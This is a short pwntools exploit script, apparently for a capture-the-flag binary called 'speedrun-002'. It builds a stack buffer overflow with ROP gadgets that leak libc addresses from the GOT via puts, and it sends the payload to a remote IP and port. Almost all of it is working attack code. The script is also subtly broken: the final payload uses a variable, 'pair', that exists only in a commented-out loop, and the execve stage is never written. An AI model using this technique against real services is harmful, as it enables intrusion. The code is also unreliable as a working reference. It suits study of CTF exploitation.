#!/usr/bin/env python3

from pwn import *
import pprint

exe = ELF("./speedrun-002")
libc = ELF("./libc6_2.27-3ubuntu1_amd64.so")

pprint.pprint(libc.got)

context.binary = exe
context.libc = libc

LOCAL = 0
DEBUG = 0

#POP_RAX = pack(0x00007ff1f047cca4)
POP_RDX = pack(0x4006ec)
POP_RDI = pack(0x4008a3)


PUTS_PLT = pack(exe.plt['puts'])

PUTS_GOT = pack(exe.got['puts'])
GETENV_GOT = pack(exe.got['getenv'])
READ_GOT = pack(exe.got['read'])

#READ_GADGET = pack(0x400705)
READ_GADGET = pack(0x40074c)

# syscall
#SYSCALL = pack(0x00007f359d469af6)

syscall_num = 0x3b

puts_targets = [('puts', PUTS_GOT), ('getenv', GETENV_GOT), ('read', READ_GOT)]
#puts_targets = [('puts', PUTS_GOT)]

def conn():
    if LOCAL:
        if DEBUG:
            return gdb.debug([exe.path])
        else:
            return process([exe.path])
    else:
        return remote("52.43.247.192", 31337)


def main():
    r = conn()

    # good luck pwning :)
    """
    for i, pair in enumerate(puts_targets):
        print("i is " + str(i))
        sleep(0.5)
        r.send('Everything intelligent is so boring.')
        sleep(0.5)
        r.send(b'a'*0x400 + b"ABCDEFGH" + 
               POP_RDI + pair[1] + PUTS_PLT +
               READ_GADGET);
        sleep(0.5)
        str_data = r.recvuntil('Fascinating.\x0a')
        print(str_data)
        data = reversed(r.recvline()[:-1:]);
        print ("Got data for " + pair[0] +"@got:")
        print ('0x' + (''.join(format(x, '02x') for x in data)))
        sleep(0.5);
    """
    r.send('Everything intelligent is so boring.')
    sleep(0.5)
    r.send(b'a'*0x400 + b"ABCDEFGH" + 
           POP_RDI + pair[1] + PUTS_PLT +
           READ_GADGET);
    r.interactive()


if __name__ == "__main__":
    main()
